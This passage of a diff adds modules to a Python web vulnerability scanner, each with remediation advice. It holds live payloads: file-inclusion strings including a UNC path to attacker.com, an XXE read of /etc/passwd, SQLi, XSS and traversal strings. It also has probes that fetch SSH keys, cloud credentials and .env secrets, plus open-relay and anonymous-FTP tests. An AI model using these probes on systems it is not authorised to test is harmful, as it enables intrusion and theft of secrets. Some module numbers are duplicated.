+                    })
+                    vuln(f"XPath Injection [{pname}] — {desc}", "High")
+                    found = True
+                    break
+            except Exception:
+                pass
+    if not found:
+        good("XPath Injection: No injection points found")
+    _module_done("xpath_inject")
+
+
+# ═══ MODULE 102 — REMOTE FILE INCLUSION (v14.0) ════════════════════
+def rfi_scan(url):
+    """MODULE 102 — Remote File Inclusion (RFI) detection."""
+    if _module_skip("rfi"):
+        info("Skipping RFI (already done)"); return
+    section("MODULE 102 — REMOTE FILE INCLUSION","🌐")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    params = parse_qs(parsed.query)
+    found  = False
+    # RFI test payloads — using safe external URLs
+    rfi_payloads = [
+        "http://169.254.169.254/",           # AWS IMDS
+        "http://metadata.google.internal/",  # GCP metadata
+        "http://127.0.0.1/",                 # localhost loopback
+        "https://example.com/",              # external domain
+        "\\\\attacker.com\\share",           # UNC path (Windows)
+        "php://input",                       # PHP wrapper
+        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",  # base64 phpinfo
+        "expect://id",                       # expect wrapper
+        "zip://./shell.zip%23shell",         # zip wrapper
+        "phar://./shell.phar/shell",         # phar wrapper
+    ]
+    rfi_params = list(params.keys()) if params else ["file","page","include","path","doc","load","template","view","url"]
+    # Also add common RFI param names
+    rfi_params = list(set(rfi_params + ["file","page","include","path","load","template","view","url","module"]))
+    success_signs = ["root:","[php","phpinfo","uid=","www-data","content-type: text/html",
+                     "<!doctype","<html","apache","nginx"]
+    for pname in rfi_params[:6]:
+        for payload in rfi_payloads[:5]:
+            ep = f"{base}{parsed.path}?{pname}={_ue(payload)}"
+            try:
+                r = SESSION.get(ep, timeout=TIMEOUT, verify=False)
+                resp_l = r.text.lower()
+                # RFI confirmed if content of remote URL appears
+                if any(s in resp_l for s in success_signs) and r.status_code == 200:
+                    add("rfi", {
+                        "type": "Remote File Inclusion",
+                        "severity": "Critical",
+                        "url": ep,
+                        "param": pname,
+                        "payload": payload,
+                        "detail": f"RFI possible — remote content included via param '{pname}'={payload}",
+                        "remediation": (
+                            "1. Disable allow_url_include in php.ini\n"
+                            "2. Never pass user input to include/require functions\n"
+                            "3. Use whitelist of allowed files\n"
+                            "4. Set open_basedir restriction"),
+                    })
+                    vuln(f"RFI via param={pname} payload={payload[:40]}", "Critical")
+                    found = True
+            except Exception:
+                pass
+    if not found:
+        good("RFI: No remote file inclusion found")
+    _module_done("rfi")
+
+
+# ═══ MODULE 103 — SESSION FIXATION (v14.0) ════════════════════════
+def session_fixation_scan(url):
+    """MODULE 103 — Session Fixation vulnerability detection."""
+    if _module_skip("session_fix"):
+        info("Skipping Session Fixation (already done)"); return
+    section("MODULE 103 — SESSION FIXATION","🍪")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    found  = False
+    login_paths = ["/login","/signin","/auth","/account/login",
+                   "/user/login","/admin/login","/wp-login.php","/api/login"]
+    for path in login_paths:
+        ep = base + path
+        try:
+            # Step 1: Set a known session ID before login
+            fixed_session = "WEBSCANPRO_TEST_SESSION_12345"
+            # Try setting session via cookie
+            test_cookies = {"PHPSESSID": fixed_session,
+                            "JSESSIONID": fixed_session,
+                            "session": fixed_session,
+                            "sid": fixed_session}
+            r1 = SESSION.get(ep, cookies=test_cookies, timeout=TIMEOUT, verify=False)
+            if r1.status_code not in (200, 302, 405):
+                continue
+            # Check if server accepted our fixed session
+            resp_cookies = dict(r1.cookies)
+            for ck_name, ck_val in resp_cookies.items():
+                if ck_name.upper() in ("PHPSESSID","JSESSIONID","SESSION","SID","SESSIONID"):
+                    if ck_val == fixed_session:
+                        # Server accepted our fixed session — vulnerable
+                        add("session_fix", {
+                            "type": "Session Fixation",
+                            "severity": "High",
+                            "url": ep,
+                            "cookie": ck_name,
+                            "detail": f"Server accepted pre-set session ID '{fixed_session}' via cookie '{ck_name}' at {ep}. Attacker can fix a session ID and trick user into authenticating with it.",
+                            "remediation": (
+                                "1. Regenerate session ID on login: session_regenerate_id(true)\n"
+                                "2. Reject externally provided session IDs\n"
+                                "3. Invalidate old session on login\n"
+                                "4. Set HttpOnly and Secure flags on session cookies\n"
+                                "5. Use SameSite=Strict cookie attribute"),
+                        })
+                        vuln(f"Session Fixation at {ep} — cookie '{ck_name}' accepted fixed ID", "High")
+                        found = True
+                    else:
+                        # Server changed session ID — not vulnerable (good behavior)
+                        info(f"  Session Fixation: {ep} — server regenerated session (safe)")
+            # Also check if session ID is in URL (another fixation vector)
+            if "jsessionid=" in r1.url.lower() or "phpsessid=" in r1.url.lower():
+                add("session_fix", {
+                    "type": "Session ID in URL",
+                    "severity": "Medium",
+                    "url": r1.url,
+                    "detail": f"Session ID exposed in URL — allows session fixation via link sharing",
+                    "remediation": "Store session IDs only in cookies, never in URLs.",
+                })
+                vuln(f"Session ID in URL at {ep}", "Medium")
+                found = True
+        except Exception:
+            pass
+    if not found:
+        good("Session Fixation: No fixation vulnerability found")
+    _module_done("session_fix")
+
+
+# ═══ MODULE 104 — GIT/SVN EXPOSURE DEEP (v14.0) ════════════════════
+def git_svn_exposure_deep(url):
+    """MODULE 104 — Deep Git/SVN exposure with source extraction."""
+    if _module_skip("git_svn_deep"):
+        info("Skipping Git/SVN Deep Exposure (already done)"); return
+    section("MODULE 104 — GIT/SVN EXPOSURE (DEEP)","🔀")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    found  = False
+    # VCS paths to check
+    vcs_paths = {
+        "git": ["/.git/HEAD","/.git/config","/.git/COMMIT_EDITMSG",
+                "/.git/logs/HEAD","/.git/refs/heads/main","/.git/refs/heads/master",
+                "/.git/packed-refs","/.git/index","/.git/FETCH_HEAD"],
+        "svn": ["/.svn/entries","/.svn/wc.db","/.svn/format","/.svn/README.txt"],
+        "hg":  ["/.hg/requires","/.hg/00changelog.i","/.hgignore"],
+        "cvs": ["/CVS/Root","/CVS/Repository","/CVS/Entries"],
+        "bzr": ["/.bzr/branch-format","/.bzr/repository/format"],
+    }
+    for vcs, paths in vcs_paths.items():
+        for path in paths:
+            ep = base + path
+            try:
+                r = SESSION.get(ep, timeout=TIMEOUT, verify=False)
+                if r.status_code == 200 and len(r.content) > 0:
+                    content_preview = r.text[:300]
+                    # Confirm it's a real VCS file
+                    confirm_signs = {
+                        "git": ["ref:","[core]","repositoryformatversion","HEAD","master","main"],
+                        "svn": ["dir","10","12","svn:","wc-entries"],
+                        "hg":  ["revlogv1","store","dotencode","fncache"],
+                        "cvs": ["/cvsroot",":pserver:",":ext:"],
+                        "bzr": ["Bazaar","Branch format"],
+                    }
+                    if any(s.lower() in content_preview.lower() for s in confirm_signs.get(vcs,[])):
+                        add("git_svn_deep", {
+                            "type": f"{vcs.upper()} Repository Exposed",
+                            "severity": "Critical",
+                            "url": ep,
+                            "vcs": vcs,
+                            "preview": content_preview[:200],
+                            "detail": f"{vcs.upper()} repository file accessible at {ep} — full source code may be extractable",
+                            "remediation": (
+                                f"1. Block access to /.{vcs}/ in web server config\n"
+                                f"2. Nginx: location ~ /\\.{vcs} {{ deny all; }}\n"
+                                f"3. Apache: RedirectMatch 404 /\\.{vcs}\n"
+                                f"4. Remove VCS directories from production servers\n"
+                                f"5. Use .gitignore / deployment scripts that exclude VCS dirs"),
+                        })
+                        vuln(f"{vcs.upper()} Exposed: {ep}", "Critical")
+                        found = True
+                        # Try to extract more info from git
+                        if vcs == "git":
+                            for extra in ["/.git/config","/.git/logs/HEAD"]:
+                                try:
+                                    re2 = SESSION.get(base+extra, timeout=TIMEOUT, verify=False)
+                                    if re2.status_code == 200 and re2.text.strip():
+                                        info(f"  Git config/log accessible: {base+extra}")
+                                        # Check for remote URLs with credentials
+                                        if "@" in re2.text and "://" in re2.text:
+                                            vuln(f"Git config contains URL with possible credentials!", "Critical")
+                                            add("git_svn_deep", {
+                                                "type": "Credentials in Git Config",
+                                                "severity": "Critical",
+                                                "url": base+extra,
+                                                "detail": f"Git config may contain credentials in remote URL",
+                                                "remediation": "Remove credentials from git remote URLs. Use SSH keys or credential managers.",
+                                            })
+                                except Exception:
+                                    pass
+            except Exception:
+                pass
+    if not found:
+        good("Git/SVN Deep: No VCS repositories exposed")
+    _module_done("git_svn_deep")
+
+
+# ═══ MODULE 105 — ENV FILE EXPOSURE (v14.0) ════════════════════════
+def env_file_exposure(url):
+    """MODULE 105 — Environment file and secret config exposure."""
+    if _module_skip("env_exposure"):
+        info("Skipping ENV File Exposure (already done)"); return
+    section("MODULE 105 — ENV FILE EXPOSURE","🔑")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    found  = False
+    env_paths = [
+        "/.env",".env.local",".env.production",".env.development",
+        ".env.staging",".env.backup",".env.example",".env.sample",
+        ".env.old",".env.bak",".env.orig",".env.save",".env.1",".env.2",
+        "/config/.env","/.env.php","/.env.js","/app/.env","/src/.env",
+        "/backend/.env","/api/.env","/server/.env","/web/.env",
+        "/config/database.yml","/config/secrets.yml","/config/credentials.yml",
+        "/config/application.yml","/config/config.yml","/config/settings.yml",
+        "/.aws/credentials","/.aws/config",
+        "/wp-config.php","/wp-config.php.bak","/wp-config.old",
+        "/configuration.php","/config.php","/settings.php",
+        "/database.php","/db.php","/db_config.php",
+        "/composer.json","/composer.lock","/package.json","/yarn.lock",
+        "/Dockerfile","/.dockerenv","/docker-compose.yml",
+        "/Procfile","/app.yaml","/app.yml",
+        "/.npmrc","/.yarnrc","/.pip.conf","/requirements.txt",
+        "/Gemfile","/.bundle/config",
+        "/.travis.yml","/.github/workflows/deploy.yml","/Jenkinsfile",
+        "/.bash_history","/root/.bash_history","/.zsh_history",
+        "/id_rsa","/id_rsa.pub","/.ssh/id_rsa","/.ssh/known_hosts",
+        "/phpinfo.php","/info.php","/test.php","/debug.php",
+        "/.htpasswd","/.htaccess","/web.config","/crossdomain.xml",
+        "/robots.txt","/sitemap.xml","/humans.txt",
+    ]
+    # Signs that file contains secrets
+    secret_signs = [
+        "api_key","apikey","api key","secret","password","passwd","token",
+        "access_key","secret_key","private_key","client_secret",
+        "db_password","database_password","mysql_password","redis_password",
+        "aws_access","aws_secret","s3_key","stripe_","twilio_",
+        "sendgrid_","mailgun_","smtp_password","ftp_password",
+        "ssh_key","rsa_key","begin rsa","begin openssh",
+        "AKIA","sk_live_","pk_live_","ghp_","ghs_","xoxb-","xoxp-",
+    ]
+    for path in env_paths:
+        if not path.startswith("/"):
+            path = "/" + path
+        ep = base + path
+        try:
+            r = SESSION.get(ep, timeout=TIMEOUT, verify=False)
+            if r.status_code == 200 and len(r.content) > 10:
+                content = r.text
+                content_l = content.lower()
+                # Find actual secrets
+                found_secrets = [s for s in secret_signs if s in content_l]
+                if found_secrets or path.endswith((".env",".yml",".yaml","config.php","wp-config.php")):
+                    sev = "Critical" if found_secrets else "High"
+                    # Extract potential key/value pairs
+                    preview = content[:400].replace("<","&lt;")
+                    add("env_exposure", {
+                        "type": f"Sensitive File Exposed: {path}",
+                        "severity": sev,
+                        "url": ep,
+                        "path": path,
+                        "secrets_found": found_secrets[:5],
+                        "preview": preview,
+                        "detail": f"File '{path}' accessible ({len(content)} bytes). Contains secret indicators: {found_secrets[:5]}",
+                        "remediation": (
+                            f"1. Block {path} in web server config immediately\n"
+                            "2. Rotate ALL exposed credentials/API keys\n"
+                            "3. Move secrets to environment variables or vault\n"
+                            "4. Add to .gitignore, never commit secrets\n"
+                            "5. Use secret scanning in CI/CD (GitGuardian, truffleHog)"),
+                    })
+                    vuln(f"ENV/Secret file exposed: {ep} [secrets: {found_secrets[:3]}]", sev)
+                    found = True
+        except Exception:
+            pass
+    if not found:
+        good("ENV Exposure: No environment files exposed")
+    _module_done("env_exposure")
+
+
+# ═══ MODULE 106 — SOURCE MAP EXPOSURE (v14.0) ══════════════════════
+def source_map_exposure(url):
+    """MODULE 106 — JavaScript source map exposure."""
+    if _module_skip("source_map"):
+        info("Skipping Source Map Exposure (already done)"); return
+    section("MODULE 106 — SOURCE MAP EXPOSURE","🗺")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    found  = False
+    # Find JS files from main page
+    try:
+        r = SESSION.get(url, timeout=TIMEOUT, verify=False)
+        js_urls = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', r.text)
+        js_urls = [j if j.startswith("http") else base+j for j in js_urls]
+    except Exception:
+        js_urls = []
+    # Also check common JS paths
+    common_js = ["/static/js/main.js","/assets/js/app.js","/js/app.js",
+                 "/js/main.js","/dist/main.js","/bundle.js","/app.js"]
+    all_js = list(set(js_urls[:10] + [base+p for p in common_js]))
+
+    for js_url in all_js:
+        # Check for sourceMappingURL comment in JS
+        try:
+            r = SESSION.get(js_url, timeout=TIMEOUT, verify=False)
+            if r.status_code != 200: continue
+            map_match = re.search(r'//[#@]\s*sourceMappingURL=(.+)', r.text)
+            map_url = None
+            if map_match:
+                map_ref = map_match.group(1).strip()
+                if map_ref.startswith("http"):
+                    map_url = map_ref
+                elif map_ref.startswith("data:"):
+                    # Inline source map — still a finding
+                    add("source_map", {
+                        "type": "Inline Source Map",
+                        "severity": "Medium",
+                        "url": js_url,
+                        "detail": f"Inline source map found in {js_url} — exposes original source code structure",
+                        "remediation": "Remove //# sourceMappingURL directives from production JS files.",
+                    })
+                    vuln(f"Inline Source Map in {js_url}", "Medium")
+                    found = True
+                    continue
+                else:
+                    from urllib.parse import urljoin as _uj3
+                    map_url = _uj3(js_url, map_ref)
+            else:
+                map_url = js_url + ".map"
+            # Try to fetch .map file
+            if map_url:
+                mr = SESSION.get(map_url, timeout=TIMEOUT, verify=False)
+                if mr.status_code == 200 and "sources" in mr.text:
+                    try:
+                        map_data = json.loads(mr.text)
+                        sources = map_data.get("sources", [])
+                        # Count source files
+                        src_count = len(sources)
+                        # Look for interesting files
+                        interesting = [s for s in sources if any(
+                            x in s.lower() for x in ["secret","config","key","auth","password","api"])]
+                        add("source_map", {
+                            "type": "JavaScript Source Map Exposed",
+                            "severity": "High",
+                            "url": map_url,
+                            "js_file": js_url,
+                            "source_count": src_count,
+                            "interesting_sources": interesting[:5],
+                            "detail": f"Source map at {map_url} exposes {src_count} original source files. Interesting: {interesting[:3]}",
+                            "remediation": (
+                                "1. Remove .map files from production deployment\n"
+                                "2. Configure webpack to not generate source maps in prod\n"
+                                "3. If needed, serve maps only internally (not publicly)\n"
+                                "4. Set 'devtool: false' in webpack production config"),
+                        })
+                        vuln(f"Source Map exposed: {map_url} ({src_count} source files)", "High")
+                        found = True
+                    except Exception:
+                        pass
+        except Exception:
+            pass
+    if not found:
+        good("Source Map: No exposed source maps found")
+    _module_done("source_map")
+
+
+# ═══ MODULE 107 — SOAP/WSDL INJECTION (v14.0) ═════════════════════
+def soap_wsdl_scan(url):
+    """MODULE 107 — SOAP/WSDL endpoint discovery and injection."""
+    if _module_skip("soap_wsdl"):
+        info("Skipping SOAP/WSDL Scan (already done)"); return
+    section("MODULE 107 — SOAP/WSDL INJECTION","📡")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    found  = False
+    wsdl_paths = [
+        "/?wsdl","/?WSDL","/wsdl","/api/wsdl","/service?wsdl",
+        "/services?wsdl","/ws?wsdl","/soap?wsdl","/rpc?wsdl",
+        "/Service.asmx?wsdl","/WebService.asmx?wsdl","/api.asmx?wsdl",
+        "/services/soap?wsdl","/services/api?wsdl","/v1/soap?wsdl",
+        "/endpoint?wsdl","/xmlrpc","/xmlrpc.php","/rpc/",
+        "/axis/services","/axis2/services","/jbossws/services",
+    ]
+    soap_injection_payloads = [
+        # XXE via SOAP
+        """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+<soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>""",
+        # SQL injection via SOAP
+        """<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+<soap:Body><search><term>' OR '1'='1</term></search></soap:Body></soap:Envelope>""",
+        # XSS via SOAP
+        """<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+<soap:Body><user><name><![CDATA[<script>alert(1)</script>]]></name></user></soap:Body></soap:Envelope>""",
+    ]
+    soap_headers = {"Content-Type": "text/xml; charset=utf-8",
+                    "SOAPAction": '""'}
+    # First find WSDL endpoints
+    for path in wsdl_paths:
+        ep = base + path
+        try:
+            r = SESSION.get(ep, timeout=TIMEOUT, verify=False)
+            if r.status_code == 200:
+                ct = r.headers.get("content-type","").lower()
+                content_l = r.text.lower()
+                if any(s in content_l for s in ["wsdl","soap","definitions","porttype","binding","service"]):
+                    add("soap_wsdl", {
+                        "type": "WSDL Endpoint Exposed",
+                        "severity": "Medium",
+                        "url": ep,
+                        "detail": f"WSDL/SOAP endpoint exposed at {ep} — reveals API structure and operations",
+                        "remediation": (
+                            "1. Restrict WSDL access to authorized clients\n"
+                            "2. Require authentication before WSDL exposure\n"
+                            "3. Remove WSDL from public-facing endpoints\n"
+                            "4. Implement WSS (Web Services Security) authentication"),
+                    })
+                    vuln(f"WSDL Exposed: {ep}", "Medium")
+                    found = True
+                    # Test SOAP injection on this endpoint
+                    for payload in soap_injection_payloads:
+                        try:
+                            pr = SESSION.post(ep, data=payload.encode(),
+                                              headers=soap_headers, timeout=TIMEOUT, verify=False)
+                            resp_l = pr.text.lower()
+                            if "root:" in resp_l or "etc/passwd" in resp_l:
+                                add("soap_wsdl", {
+                                    "type": "SOAP XXE Injection",
+                                    "severity": "Critical",
+                                    "url": ep,
+                                    "detail": "SOAP endpoint vulnerable to XXE — /etc/passwd accessible via SOAP XXE",
+                                    "remediation": "Disable XML external entity processing in SOAP parser.",
+                                })
+                                vuln(f"SOAP XXE at {ep}", "Critical")
+                            elif "sql" in resp_l or "mysql" in resp_l or "ora-" in resp_l:
+                                add("soap_wsdl", {
+                                    "type": "SOAP SQL Injection",
+                                    "severity": "High",
+                                    "url": ep,
+                                    "detail": "SOAP endpoint shows SQL error — may be vulnerable to injection",
+                                    "remediation": "Use parameterized queries for all SOAP parameter handling.",
+                                })
+                                vuln(f"SOAP SQL Injection at {ep}", "High")
+                        except Exception:
+                            pass
+        except Exception:
+            pass
+    if not found:
+        good("SOAP/WSDL: No SOAP endpoints found")
+    _module_done("soap_wsdl")
+
+
+# ═══ MODULE 108-117 — EXPOSED SERVICES (v14.0) ════════════════════
+def exposed_services_scan(url, target_ip=""):
+    """MODULE 108-117 — Detect unauthenticated/exposed backend services."""
+    if _module_skip("exposed_services"):
+        info("Skipping Exposed Services (already done)"); return
+    section("MODULE 108-117 — EXPOSED SERVICES (Redis·MongoDB·Elastic·Docker·K8s·Jenkins·SMTP·FTP·VNC·CouchDB)","🔌")
+    parsed = _up(url)
+    host   = parsed.netloc.split(":")[0]
+    if not target_ip:
+        try: target_ip = socket.gethostbyname(host)
+        except Exception: target_ip = host
+    found  = False
+
+    services = [
+        # (module_num, name, port, protocol, test_data, success_signs, severity)
+        (108, "Redis",          6379, "tcp",  b"PING\r\n",           [b"+PONG",b"-ERR"],       "Critical"),
+        (109, "MongoDB",        27017,"tcp",  b"\x41\x00\x00\x00",  [b"MongoDB",b"ismaster"], "Critical"),
+        (110, "Elasticsearch",  9200, "http", None,                  ["cluster_name","nodes"], "Critical"),
+        (111, "Docker API",     2375, "http", None,                  ["/containers","/images","Docker"], "Critical"),
+        (112, "Kubernetes API", 8080, "http", None,                  ["apiVersion","kind","nodes"],       "Critical"),
+        (113, "Kubernetes API", 6443, "https",None,                  ["apiVersion","kind"],    "Critical"),
+        (114, "Jenkins",        8080, "http", None,                  ["jenkins","hudson","x-jenkins"],    "High"),
+        (115, "CouchDB",        5984, "http", None,                  ["couchdb","version","db_name"],     "High"),
+        (116, "Memcached",      11211,"tcp",  b"stats\r\n",          [b"STAT",b"uptime"],      "High"),
+        (117, "RabbitMQ",       15672,"http", None,                  ["rabbitmq","vhost","queue"],        "High"),
+    ]
+
+    def _tcp_test(ip, port, data, signs, timeout=3):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(timeout)
+            s.connect((ip, port))
+            if data: s.send(data)
+            resp = s.recv(256)
+            s.close()
+            return any(sign in resp for sign in signs)
+        except Exception:
+            return False
+
+    def _http_test(scheme, ip, port, path, signs, timeout=4):
+        try:
+            ep = f"{scheme}://{ip}:{port}{path}"
+            r = SESSION.get(ep, timeout=timeout, verify=False)
+            if r.status_code == 200:
+                resp_l = r.text.lower()
+                return any(s.lower() in resp_l for s in signs)
+        except Exception:
+            pass
+        return False
+
+    for mod_num, name, port, proto, test_data, signs, sev in services:
+        vulnerable = False
+        try:
+            if proto == "tcp":
+                vulnerable = _tcp_test(target_ip, port, test_data, signs)
+            elif proto == "http":
+                vulnerable = _http_test("http", target_ip, port, "/", signs)
+            elif proto == "https":
+                vulnerable = _http_test("https", target_ip, port, "/", signs)
+            if vulnerable:
+                add("exposed_services", {
+                    "type": f"Exposed {name} (Module {mod_num})",
+                    "severity": sev,
+                    "url": f"{proto}://{target_ip}:{port}",
+                    "service": name,
+                    "port": port,
+                    "detail": f"{name} service on port {port} is accessible without authentication — data at risk",
+                    "remediation": (
+                        f"1. Bind {name} to localhost: bind 127.0.0.1\n"
+                        f"2. Enable {name} authentication\n"
+                        f"3. Use firewall to block port {port} from internet\n"
+                        f"4. Place {name} behind VPN or private network"),
+                })
+                vuln(f"Exposed {name} on {target_ip}:{port} — UNAUTHENTICATED", sev)
+                found = True
+        except Exception:
+            pass
+
+    # SMTP Open Relay test
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        if s.connect_ex((target_ip, 25)) == 0:
+            s.recv(512)
+            s.send(b"EHLO test.com\r\n"); s.recv(512)
+            s.send(b"MAIL FROM:<test@test.com>\r\n")
+            resp = s.recv(512)
+            s.send(b"RCPT TO:<victim@external.com>\r\n")
+            resp2 = s.recv(512)
+            s.send(b"QUIT\r\n")
+            s.close()
+            if b"250" in resp2:
+                add("exposed_services", {
+                    "type": "SMTP Open Relay (Module 118)",
+                    "severity": "High",
+                    "url": f"smtp://{target_ip}:25",
+                    "detail": f"SMTP on port 25 accepts relay to external domains — can be abused for spam/phishing",
+                    "remediation": "Configure SMTP to relay only for authenticated users. Set mynetworks properly in Postfix.",
+                })
+                vuln(f"SMTP Open Relay at {target_ip}:25", "High")
+                found = True
+    except Exception:
+        pass
+
+    # Anonymous FTP test
+    try:
+        import ftplib as _ftp
+        ftp = _ftp.FTP()
+        ftp.connect(target_ip, 21, timeout=5)
+        resp = ftp.login("anonymous", "webscan@test.com")
+        files = ftp.nlst()
+        ftp.quit()
+        add("exposed_services", {
+            "type": "Anonymous FTP Access (Module 119)",
+            "severity": "High",
+            "url": f"ftp://{target_ip}:21",
+            "files": files[:10],
+            "detail": f"FTP anonymous login allowed — {len(files)} files/dirs visible: {files[:5]}",
+            "remediation": "Disable anonymous FTP access. Require authentication for all FTP access.",
+        })
+        vuln(f"Anonymous FTP at {target_ip}:21 ({len(files)} files visible)", "High")
+        found = True
+    except Exception:
+        pass
+
+    if not found:
+        good("Exposed Services: No unauthenticated services detected")
+    _module_done("exposed_services")
+
+
+# ═══ MODULE 118 — CSP ANALYSIS (v14.0) ════════════════════════════
+def csp_analysis_scan(url):
+    """MODULE 118 — Content Security Policy analysis and bypass detection."""
+    if _module_skip("csp_analysis"):
+        info("Skipping CSP Analysis (already done)"); return
+    section("MODULE 118 — CSP ANALYSIS","🛡")
+    found = False
+    try:
+        r = SESSION.get(url, timeout=TIMEOUT, verify=False)
+        csp = (r.headers.get("Content-Security-Policy","") or
+               r.headers.get("Content-Security-Policy-Report-Only",""))
+        if not csp:
+            add("csp_analysis", {
+                "type": "Missing Content-Security-Policy",
+                "severity": "Medium",
+                "url": url,
+                "detail": "No Content-Security-Policy header — XSS attacks have no browser-level mitigation",
+                "remediation": "Implement a strict CSP: default-src 'self'; script-src 'self'; object-src 'none';",
+            })
+            vuln("Missing CSP header", "Medium")
+            found = True
+        else:
+            info(f"CSP found: {csp[:100]}...")
+            issues = []
+            # Unsafe directives
+            if "'unsafe-inline'" in csp:
+                issues.append(("'unsafe-inline' in CSP — allows inline scripts (XSS risk)", "High"))
+            if "'unsafe-eval'" in csp:
+                issues.append(("'unsafe-eval' in CSP — allows eval() (XSS risk)", "High"))
+            if "data:" in csp and "script-src" in csp:
+                issues.append(("data: URI in script-src — allows XSS via data URIs", "High"))
+            if "http://" in csp:
+                issues.append(("HTTP (non-HTTPS) source in CSP — allows MITM bypass", "Medium"))
+            # Wildcard sources
+            if "script-src *" in csp or "script-src: *" in csp:
+                issues.append(("Wildcard * in script-src — CSP provides no protection", "High"))
+            if "default-src *" in csp:
+                issues.append(("Wildcard * in default-src — CSP bypassed entirely", "High"))
+            # Missing directives
+            if "default-src" not in csp and "script-src" not in csp:
+                issues.append(("No default-src or script-src — scripts can load from anywhere", "Medium"))
+            if "object-src" not in csp and "default-src" not in csp:
+                issues.append(("Missing object-src — Flash/plugin-based XSS possible", "Low"))
+            if "frame-ancestors" not in csp and "X-Frame-Options" not in r.headers:
+                issues.append(("No frame-ancestors in CSP and no X-Frame-Options — clickjacking risk", "Medium"))
+            for issue, sev in issues:
+                add("csp_analysis", {
+                    "type": f"CSP Weakness: {issue[:60]}",
+                    "severity": sev,
+                    "url": url,
+                    "csp": csp[:300],
+                    "detail": issue,
+                    "remediation": "Tighten CSP: remove 'unsafe-inline', 'unsafe-eval', wildcards. Use nonces or hashes for inline scripts.",
+                })
+                vuln(f"CSP Issue: {issue[:80]}", sev)
+                found = True
+    except Exception as _e:
+        warn(f"CSP Analysis error: {_e}")
+    if not found:
+        good("CSP Analysis: CSP header present and no major weaknesses found")
+    _module_done("csp_analysis")
+
+
+# ═══ MODULE 119 — NULL BYTE INJECTION (v14.0) ══════════════════════
+def null_byte_injection_scan(url):
+    """MODULE 119 — Null byte injection for filter bypass."""
+    if _module_skip("null_byte"):
+        info("Skipping Null Byte Injection (already done)"); return
+    section("MODULE 119 — NULL BYTE INJECTION","⬛")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    params = parse_qs(parsed.query)
+    found  = False
+    payloads = [
+        ("%00", "URL-encoded null byte"),
+        ("%00.jpg", "Null byte extension bypass"),
+        ("test%00.php", "PHP file access bypass"),
+        ("%00/etc/passwd", "Null byte path traversal"),
+        ("test%00<script>", "Null byte XSS bypass"),
+        ("../../../../etc/passwd%00", "Traversal + null terminator"),
+        ("%00%00%00", "Multiple null bytes"),
+    ]
+    success_signs = ["root:","[php","fatal error","warning:","include(",
+                     "file not found","no such file","permission denied"]
+    test_params = list(params.keys())[:3] if params else ["file","page","include","path","name"]
+    for pname in test_params:
+        for payload, desc in payloads:
+            ep = f"{base}{parsed.path}?{pname}={payload}"
+            try:
+                r = SESSION.get(ep, timeout=TIMEOUT, verify=False)
+                resp_l = r.text.lower()
+                if any(s in resp_l for s in success_signs):
+                    add("null_byte", {
+                        "type": "Null Byte Injection",
+                        "severity": "High",
+                        "url": ep,
+                        "param": pname,
+                        "payload": payload,
+                        "detail": f"Null byte injection '{payload}' on param '{pname}' — {desc} — may bypass file extension filters",
+                        "remediation": (
+                            "1. Validate and sanitize all user input\n"
+                            "2. Use language-native functions for file operations\n"
+                            "3. Remove null bytes from input before processing\n"
+                            "4. Modern PHP (5.3+) blocks null bytes in file functions"),
+                    })
+                    vuln(f"Null Byte Injection [{pname}={payload}]", "High")
+                    found = True
+            except Exception:
+                pass
+    if not found:
+        good("Null Byte: No null byte injection found")
+    _module_done("null_byte")
+
+
+# ═══ MODULE 120 — BUSINESS LOGIC FLAWS (v14.0) ════════════════════
+def business_logic_scan(url):
+    """MODULE 120 — Business logic flaw detection (price, qty, workflow)."""
+    if _module_skip("biz_logic_adv"):
+        info("Skipping Business Logic (already done)"); return
+    section("MODULE 120 — BUSINESS LOGIC FLAWS","🏦")
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    found  = False
+    # Test price/quantity manipulation endpoints
+    shop_endpoints = [
+        "/cart","/checkout","/order","/api/cart","/api/order","/shop/cart",
+        "/store/cart","/buy","/purchase","/payment","/basket",
+    ]
+    # Price manipulation payloads
+    price_payloads = [
+        {"price": "-1"},
+        {"price": "0"},
+        {"price": "0.01"},
+        {"amount": "-1"},
+        {"total": "-100"},
+        {"cost": "0"},
+        {"quantity": "0"},
+        {"quantity": "-1"},
+        {"qty": "99999999"},
+        {"discount": "100"},
+        {"coupon_percent": "100"},
+    ]
+    for path in shop_endpoints:
+        ep = base + path
+        try:
+            r = SESSION.get(ep, timeout=TIMEOUT, verify=False)
+            if r.status_code not in (200, 302, 405):
+                continue
+            info(f"  Business Logic: found endpoint {ep}")
+            for payload in price_payloads:
+                try:
+                    pr = SESSION.post(ep, json=payload, timeout=TIMEOUT, verify=False)
+                    resp_l = pr.text.lower()
+                    # Success signs — accepted invalid values
+                    if pr.status_code in (200,201) and any(s in resp_l for s in
+                            ["success","added","cart","order","accepted","ok","true"]):
+                        add("biz_logic_adv", {
+                            "type": "Business Logic — Price/Qty Manipulation",
+                            "severity": "High",
+                            "url": ep,
+                            "payload": payload,
+                            "detail": f"Server accepted invalid business values {payload} at {ep} — may allow free or negative-price purchases",
+                            "remediation": (
+                                "1. Validate all business values server-side\n"
+                                "2. Never trust client-sent price/quantity values\n"
+                                "3. Recalculate totals from server-side data\n"
+                                "4. Set minimum/maximum bounds for all numeric inputs\n"
+                                "5. Log and alert on anomalous transaction values"),
+                        })
